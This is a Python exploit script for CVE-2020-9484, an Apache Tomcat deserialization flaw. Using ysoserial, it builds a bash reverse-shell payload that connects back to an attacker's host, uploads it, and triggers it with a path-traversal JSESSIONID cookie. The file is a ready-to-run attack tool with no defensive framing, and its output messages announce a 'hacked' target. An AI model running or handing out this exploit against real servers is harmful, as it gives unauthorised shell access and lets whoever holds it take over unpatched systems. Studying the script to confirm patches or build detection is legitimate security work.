import argparse
import requests
import subprocess
import random
import sys
from log_colors import *
import string
requests.packages.urllib3.disable_warnings()

# CVE-2020-9484
# Apache Tomcat RCE by deserialization
# Apache Tomcat 10.x < 10.0.0-M5
# Apache Tomcat 9.x < 9.0.35
# Apache Tomcat 8.x < 8.5.55
# Apache Tomcat 7.x < 7.0.104
class CVE2020_9484:
    headers = {"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0"}
    
    def __init__(self, url, ip, port):
        print (LogColors.BLUE + "victim: " + url + "..." + LogColors.ENDC)
        self.url = url
        self.ip, self.port = ip, port
        self.filename = ''.join(random.choice(string.ascii_lowercase) for i in range(16))
    
    def payload(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(self.ip, self.port)
        jex = "bash -c {echo,$(echo -n " + cmd + " | base64)}|{base64,-d}|{bash,-i}"
        jar = 'java '
        jar += '-jar '
        jar += 'ysoserial.jar '
        jar += 'CommonsCollections4 '
        jar += '"' + jex + '" > /tmp/{}.session'.format(self.filename)
        print (LogColors.YELLOW + jar + LogColors.ENDC)
        try:
            subprocess.run(jar, shell = True)
            print (LogColors.GREEN + "reverse shell payload successfully generated :)" + LogColors.ENDC)
        except Exception as e:
            print (LogColors.RED + "generate payload failed :(" + LogColors.ENDC)

    def upload_payload(self):
        print (LogColors.BLUE + "uploading payload..." + LogColors.ENDC)
        data = {"email" : "hack@test.com"}
        session = "/tmp/{}.session".format(self.filename)
        files = {
            "data" : (self.filename, open(session, 'rb')),
        }
        r = requests.post(self.url.rstrip("/") + "/upload.jsp", params = data, files = files)
        if r.ok:
            print (LogColors.YELLOW + "successfully upload payload..." + LogColors.ENDC)
        else:
            print (LogColors.RED + "upload payload failed :(" + LogColors.ENDC)
            sys.exit()
        
    def reverse_shell(self):
        print (LogColors.BLUE + "get rev shell..." + LogColors.ENDC)
        headers = {
            "Cookie" : 'JSESSIONID=../../../../../../../../../../opt/samples/uploads/{}'.format(self.filename),
        }
        nc = '{} {}'.format(self.ip, self.port)
        r = requests.get(self.url, headers = headers)
        if r.status_code == 500:
            print (LogColors.YELLOW + "have reverse shell!" + LogColors.ENDC)
            print (LogColors.YELLOW + "check netcat: " + nc + LogColors.ENDC)
            print (LogColors.GREEN + "successfully checked rev shell, hacked :)" + LogColors.ENDC)
        else:
            print (LogColors.RED + "rev shell failed :(" + LogColors.ENDC)
            sys.exit()
    
    def exploit(self):
        self.payload()
        self.upload_payload()
        self.reverse_shell()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target', required = True, help = "Apache tomcat url")
    parser.add_argument('-l','--lhost', required = True, help = "rev shell host")
    parser.add_argument('-p','--lport', required = True, help = "rev shell port")
    args = vars(parser.parse_args())
    cve = CVE2020_9484(args['target'], args['lhost'], args['lport'])
    cve.exploit()

